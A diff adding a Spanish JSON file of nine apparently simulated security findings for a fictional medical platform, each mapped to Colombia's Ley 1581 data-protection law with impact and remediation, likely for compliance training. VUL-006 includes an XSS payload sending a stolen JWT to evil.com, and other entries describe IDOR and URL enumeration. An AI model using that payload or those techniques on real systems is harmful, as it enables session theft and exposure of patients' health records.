@@ -1,0 +1,126 @@
+{
+  "meta": {
+    "titulo": "Ley 1581 de 2012",
+    "descripcion": "Disposiciones generales para la protección de datos personales en Colombia",
+    "entidad": "Congreso de la República de Colombia"
+  },
+  "vulnerabilidades": {
+    "login_checkbox_oculto": {
+      "id": "VUL-001",
+      "titulo": "Consentimiento Obtenido por Engaño (Dark Pattern)",
+      "severidad": "CRÍTICA",
+      "articulo": "Artículo 9 — Autorización del Titular",
+      "icono": "fa-eye-slash",
+      "resumen_tecnico": "Se detectó un checkbox de consentimiento con opacity:0 y z-index:-1 en el DOM. El usuario no puede verlo ni interactuar conscientemente con él, pero su valor 'checked' se envía en el payload del formulario.",
+      "detalle_tecnico": "El elemento <input type='checkbox' id='hidden-consent'> existe en el DOM con estilos CSS que lo hacen visualmente invisible (opacity: 0.01; position: absolute; z-index: -999). A pesar de ser invisible, el navegador lo procesa y su estado 'checked=true' se serializa en el formulario POST enviado al servidor.",
+      "impacto_legal": "La Ley 1581 exige que el consentimiento sea LIBRE, PREVIO, EXPRESO e INFORMADO. Un checkbox invisible viola los cuatro principios simultáneamente. El titular nunca fue informado, nunca expresó voluntad libre y el consentimiento fue obtenido mediante engaño técnico deliberado.",
+      "articulo_texto": "'La autorización del Titular para el Tratamiento de sus datos personales deberá ser obtenida por cualquier medio que pueda ser objeto de consulta posterior.' — El consentimiento debe ser verificable y consciente.",
+      "sancion_potencial": "Multas hasta 2.000 SMMLV por el SICS. Posible acción penal por fraude informático (Art. 269F Código Penal).",
+      "recomendacion": "Eliminar el patrón oscuro. Implementar un checkbox visible, con lenguaje claro y en posición prominente del formulario. Registrar timestamp y fingerprint del consentimiento."
+    },
+    "login_http_plano": {
+      "id": "VUL-002",
+      "titulo": "Transmisión de Credenciales Médicas sin Cifrado (HTTP Plano)",
+      "severidad": "CRÍTICA",
+      "articulo": "Artículo 4, Literal f) — Principio de Seguridad",
+      "icono": "fa-unlock",
+      "resumen_tecnico": "El formulario de login realiza un POST a http:// (sin TLS). Las credenciales, incluyendo el tipo de usuario médico y el número de historia clínica, viajan en texto plano y son interceptables con cualquier proxy de red.",
+      "detalle_tecnico": "Captura de red simulada: POST http://api.medisync.com.co/auth/login — Headers: Content-Type: application/x-www-form-urlencoded — Body: username=dr.garcia%40clinica.com&password=Med1c0%402024&rol=medico&historia_clinica=HC-00892 — Sin cabeceras HSTS. Sin redirección 301 a HTTPS. Certificado SSL no configurado.",
+      "impacto_legal": "El Art. 4 lit. f) exige que los datos sean protegidos con 'medidas técnicas, humanas y administrativas'. Enviar credenciales de acceso a historias clínicas sin cifrado TLS es una violación directa del principio de seguridad. Los datos de salud son datos sensibles según el Art. 5.",
+      "articulo_texto": "'Principio de seguridad: La información sujeta a Tratamiento por el Responsable del Tratamiento o Encargado del Tratamiento se deberá manejar con las medidas técnicas, humanas y administrativas que sean necesarias para otorgar seguridad a los registros evitando su adulteración, pérdida, consulta, uso o acceso no autorizado o fraudulento.'",
+      "sancion_potencial": "Multas hasta 2.000 SMMLV. Suspensión de operaciones de la plataforma. Responsabilidad civil ante pacientes afectados.",
+      "recomendacion": "Implementar TLS 1.3 obligatorio. Configurar HSTS con preload. Habilitar redirección automática HTTP→HTTPS. Validar certificado con Let's Encrypt o CA autorizada."
+    },
+    "idor_paciente": {
+      "id": "VUL-003",
+      "titulo": "IDOR: Referencia Directa Insegura a Objeto (Acceso no Autorizado a Historia Clínica)",
+      "severidad": "CRÍTICA",
+      "articulo": "Artículo 5 — Datos Sensibles",
+      "icono": "fa-user-secret",
+      "resumen_tecnico": "La URL /paciente?id=102 expone identificadores secuenciales predecibles. Cualquier usuario autenticado puede incrementar el parámetro 'id' y acceder a la historia clínica de cualquier otro paciente sin control de autorización.",
+      "detalle_tecnico": "Vector de ataque: Usuario A (id=101) está autenticado. Modifica manualmente la URL a /paciente?id=102. El backend retorna la historia clínica completa del Paciente B sin verificar si el usuario tiene permisos sobre ese recurso. IDs secuenciales (101, 102, 103...) permiten enumeración masiva mediante scripting. No existe validación de ownership ni token de acceso por recurso.",
+      "impacto_legal": "Los datos de salud son datos sensibles según el Art. 5 de la Ley 1581, cuyo tratamiento requiere autorización explícita. Un médico tratante no está autorizado para ver historias clínicas de pacientes que no atiende. Esta falla viola simultáneamente el principio de finalidad (Art. 4 lit. b) y el deber de seguridad (Art. 17 lit. d).",
+      "articulo_texto": "'Se prohíbe el Tratamiento de datos sensibles, excepto cuando... el Titular haya dado su autorización explícita a dicho Tratamiento.' — Art. 6. Adicionalmente, Art. 17 exige que el Responsable 'adopte las medidas de seguridad necesarias para evitar el acceso no autorizado.'",
+      "sancion_potencial": "Violación de secreto profesional (Art. 385 Código Penal). Multas máximas del SICS. Demandas civiles por daño emergente y lucro cesante.",
+      "recomendacion": "Implementar UUIDs v4 en lugar de IDs secuenciales. Agregar middleware de autorización que verifique relación paciente-profesional antes de cada request. Implementar ABAC (Attribute-Based Access Control)."
+    },
+    "finalidad_paciente_fallecido": {
+      "id": "VUL-004",
+      "titulo": "Violación al Principio de Finalidad: Datos de Paciente Fallecido en CRM de Marketing",
+      "severidad": "ALTA",
+      "articulo": "Artículo 4, Literal b) — Principio de Finalidad",
+      "icono": "fa-skull",
+      "resumen_tecnico": "El paciente Carlos Mendoza, fallecido el 14/03/2019, sigue activo en la base de datos de marketing. Su información personal y datos de salud continúan siendo procesados para campañas de fidelización, recordatorios de citas y comunicaciones promocionales.",
+      "detalle_tecnico": "Registro en CRM activo: carlos.mendoza@email.com — Estado: ACTIVO — Última campaña enviada: 'Recordatorio vacuna influenza' (hace 3 días) — Score de engagement: 0% (obvio, el titular está fallecido) — La plataforma no tiene proceso automatizado de baja por defunción. No existe integración con el Registro Civil o mecanismo de revisión periódica.",
+      "impacto_legal": "El principio de finalidad exige que los datos sean tratados ÚNICAMENTE para las finalidades informadas al titular. El fallecimiento extingue la relación médico-paciente y la base legal del tratamiento. Continuar procesando datos post-mortem para fines de marketing viola la finalidad original y los derechos de los causahabientes según el Art. 16.",
+      "articulo_texto": "'Los datos personales no podrán ser obtenidos o divulgados sin previa autorización, o en ausencia de mandato legal o judicial que releve el consentimiento... El Tratamiento respetará las finalidades informadas al Titular.' — El titular fallecido no puede ejercer sus derechos, pero sus causahabientes sí.",
+      "sancion_potencial": "Reclamación de causahabientes ante el SICS. Daño moral demostrable. Multa por incumplimiento de deberes del Responsable (Art. 17).",
+      "recomendacion": "Implementar proceso de baja automática al registrar defunción. Integrar con Registraduría para verificación periódica. Política de retención de datos con TTL definido por tipo de dato y finalidad."
+    },
+    "admin_overprivileged": {
+      "id": "VUL-005",
+      "titulo": "Administrador IT con Acceso Irrestricto a Historias Clínicas (Over-Privileged)",
+      "severidad": "CRÍTICA",
+      "articulo": "Artículo 17, Literales c) y d) — Deberes del Responsable",
+      "icono": "fa-user-shield",
+      "resumen_tecnico": "El rol 'Administrador IT' tiene permisos de lectura/escritura sobre todas las tablas de la base de datos, incluyendo historias_clinicas, diagnosticos y medicamentos. Un técnico de infraestructura puede acceder a datos médicos sensibles sin justificación clínica.",
+      "detalle_tecnico": "Política IAM actual — Rol: admin_it — Permisos: SELECT, INSERT, UPDATE, DELETE en ALL TABLES — Sin row-level security. Sin enmascaramiento de datos. Sin audit trail de acceso a datos clínicos. Un administrador puede ejecutar: SELECT * FROM historias_clinicas WHERE paciente_id = ANY(SELECT id FROM pacientes) — sin dejar rastro auditado.",
+      "impacto_legal": "El Art. 17 lit. c) obliga al Responsable a 'guardar y custodiar los datos e impedir el acceso no autorizado'. El secreto médico (Ley 23 de 1981) prohíbe el acceso a datos clínicos a personas sin vínculo asistencial. La acumulación de privilegios viola el principio de mínimo privilegio exigido por estándares de seguridad referenciados por el SICS.",
+      "articulo_texto": "'Guardar bajo las condiciones de seguridad necesarias los datos personales para impedir su adulteración, pérdida, consulta, uso o acceso no autorizado o fraudulento.' — Art. 17 lit. d) Ley 1581.",
+      "sancion_potencial": "Violación del secreto profesional médico. Responsabilidad disciplinaria para el Responsable de Tratamiento. Multa hasta 2.000 SMMLV.",
+      "recomendacion": "Implementar principio de mínimo privilegio. Crear rol 'admin_infra' sin acceso a tablas clínicas. Usar Row-Level Security en PostgreSQL. Enmascarar datos PII para roles no clínicos. Implementar PAM (Privileged Access Management)."
+    },
+    "jwt_localstorage": {
+      "id": "VUL-006",
+      "titulo": "JWT Almacenado en localStorage — Susceptible a Robo por XSS",
+      "severidad": "ALTA",
+      "articulo": "Artículo 4, Literal f) y Artículo 17, Literal d)",
+      "icono": "fa-key",
+      "resumen_tecnico": "Los tokens de sesión JWT, que contienen el rol, ID de médico y permisos de acceso, se almacenan en localStorage. Cualquier script inyectado via XSS puede extraer el token y suplantar la sesión del profesional de salud.",
+      "detalle_tecnico": "localStorage.getItem('medisync_token') retorna: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicmVsIjoibWVkaWNvIiwiaWF0IjoxNzA... — Decodificado: {sub: '1234', rol: 'medico_jefe', pacientes: [101,102,103,...], exp: 1735689600} — Vector XSS: <img src=x onerror='fetch(\"https://evil.com/steal?t=\"+localStorage.getItem(\"medisync_token\"))'> — Un atacante que logre inyectar HTML en cualquier campo libre del dashboard roba el token completo.",
+      "impacto_legal": "El robo del JWT permite acceso no autorizado a historias clínicas de todos los pacientes del médico afectado. Esto constituye una brecha de seguridad que el Art. 17 obliga a prevenir y el Art. 12 de la Ley obliga a notificar al SICS dentro de los plazos establecidos.",
+      "articulo_texto": "'Adoptar un manual interno de políticas y procedimientos para garantizar el adecuado cumplimiento de la presente ley y, en especial, para la atención de consultas y reclamaciones.' — La ausencia de protección del token viola las políticas de seguridad exigidas.",
+      "sancion_potencial": "Brecha de datos notificable. Multa por incumplimiento de medidas de seguridad. Responsabilidad frente a titulares afectados.",
+      "recomendacion": "Migrar JWT a cookie HttpOnly + Secure + SameSite=Strict. Implementar CSP (Content-Security-Policy) para mitigar XSS. Usar refresh tokens de corta duración. Implementar rotación automática de tokens."
+    },
+    "db_sin_cifrado": {
+      "id": "VUL-007",
+      "titulo": "Base de Datos sin Cifrado en Reposo (No Data-at-Rest Encryption)",
+      "severidad": "CRÍTICA",
+      "articulo": "Artículo 17, Literal d) — Deberes del Responsable del Tratamiento",
+      "icono": "fa-database",
+      "resumen_tecnico": "El motor de base de datos (PostgreSQL 13) no tiene habilitado el cifrado Transparent Data Encryption (TDE). Los archivos físicos del disco que contienen historias clínicas, diagnósticos y medicamentos están sin cifrar y son legibles con acceso físico al servidor.",
+      "detalle_tecnico": "Configuración actual — postgresql.conf: ssl = off — encrypt_data_directory = false — Volumen EBS: No cifrado (AES-256 deshabilitado) — Backup S3: Sin cifrado server-side — Implicación: Un atacante con acceso al servidor de base de datos, o a un snapshot del volumen, puede copiar los archivos .pgdata y leerlos directamente con pg_filedump sin necesidad de credenciales SQL.",
+      "impacto_legal": "El Art. 17 lit. d) exige medidas técnicas para impedir acceso no autorizado. El cifrado en reposo es el control mínimo esperado para datos de salud según el CONPES 3854 y los estándares internacionales (ISO 27001) referenciados por el SICS en sus guías de cumplimiento.",
+      "articulo_texto": "'Guardar bajo las condiciones de seguridad necesarias los datos personales para impedir su adulteración, pérdida, consulta, uso o acceso no autorizado o fraudulento.' — El cifrado en reposo es la medida técnica fundamental para el cumplimiento de este deber.",
+      "sancion_potencial": "En caso de brecha: multa máxima + suspensión de operaciones. El SICS puede ordenar auditoría de seguridad completa a cargo del Responsable.",
+      "recomendacion": "Habilitar TDE en PostgreSQL con pgcrypto. Cifrar volúmenes EBS con KMS. Habilitar cifrado en backups S3 (SSE-KMS). Implementar rotación automática de claves de cifrado cada 90 días."
+    },
+    "blob_urls_publicas": {
+      "id": "VUL-008",
+      "titulo": "Exámenes Médicos (PDFs) con URLs Públicas sin Autenticación",
+      "severidad": "ALTA",
+      "articulo": "Artículo 5 — Datos Sensibles y Artículo 17",
+      "icono": "fa-file-medical",
+      "resumen_tecnico": "Los resultados de laboratorio, imágenes diagnósticas y informes médicos se almacenan en Blob Storage con URLs públicas permanentes. Cualquier persona con el enlace puede descargar el documento sin autenticación.",
+      "detalle_tecnico": "URL encontrada en respuesta API: https://storage.medisync.com.co/examenes/2024/HC-00892/lab_resultado_biometria_20240315.pdf — El archivo es accesible sin token, sin cookie, sin ninguna cabecera de autenticación. Las URLs son predecibles por su estructura: /examenes/{año}/{historia_clinica}/{tipo_examen}_{fecha}.pdf — Un atacante puede enumerar exámenes por fuerza bruta de fechas e IDs de historia clínica. El bucket no tiene Block Public Access configurado.",
+      "impacto_legal": "Los resultados de laboratorio y diagnósticos son datos sensibles (Art. 5). Su exposición pública constituye una violación grave al deber de confidencialidad y al principio de seguridad. El titular tiene derecho a que sus datos de salud sean tratados con el máximo nivel de protección.",
+      "articulo_texto": "'Para el Tratamiento de los datos sensibles deben cumplirse... las medidas de seguridad necesarias para evitar que terceros no autorizados accedan a ellos.' — Una URL pública sin autenticación niega cualquier control de acceso.",
+      "sancion_potencial": "Brecha de datos masiva notificable. Demandas individuales de pacientes. Multa máxima del SICS. Posible cierre temporal de la plataforma.",
+      "recomendacion": "Configurar bucket como privado con Block Public Access. Generar Pre-signed URLs con TTL de 15 minutos para descarga. Implementar WAF para detección de enumeración. Auditar todos los archivos actualmente expuestos."
+    },
+    "firewall_sin_logs": {
+      "id": "VUL-009",
+      "titulo": "Firewall sin Registros de Auditoría — Imposibilidad de Forensia Digital",
+      "severidad": "ALTA",
+      "articulo": "Artículo 17, Literal g) — Deber de Registro e Información",
+      "icono": "fa-shield-halved",
+      "resumen_tecnico": "El firewall perimetral no tiene habilitado el logging de conexiones. En caso de incidente de seguridad o brecha de datos, es imposible reconstruir el timeline del ataque, identificar el origen o demostrar el alcance de los datos comprometidos.",
+      "detalle_tecnico": "Configuración del firewall — Logging: DISABLED — Retention policy: N/A — SIEM integrado: NO — Alertas en tiempo real: NO — Consecuencia forense: Si un atacante exfiltró historias clínicas hace 6 meses, no existe evidencia técnica para: (1) detectar qué datos fueron accedidos, (2) notificar a los titulares afectados, (3) cumplir con la obligación de reporte al SICS, (4) presentar pruebas en un proceso legal.",
+      "impacto_legal": "El Art. 17 lit. g) obliga al Responsable a 'informar a la autoridad de protección de datos cuando se presenten violaciones a los códigos de seguridad'. Sin logs, es imposible detectar violaciones ni cumplir con el deber de notificación. El SICS puede sancionar tanto la brecha como el incumplimiento del deber de reporte.",
+      "articulo_texto": "'Informar a la autoridad de protección de datos cuando se presenten violaciones a los códigos de seguridad y existan riesgos en la administración de la información de los Titulares.' — Sin logs, no hay forma de cumplir este deber.",
+      "sancion_potencial": "Doble sanción: por la brecha de seguridad Y por incumplimiento del deber de notificación. El SICS puede imponer multas acumulativas.",
+      "recomendacion": "Habilitar logging completo en el firewall (conexiones, reglas disparadas, anomalías). Centralizar logs en SIEM (Splunk/ELK). Configurar retención mínima de 12 meses. Implementar alertas automáticas por comportamiento anómalo. Hacer drill de respuesta a incidentes trimestralmente."
+    }
+  }
+}
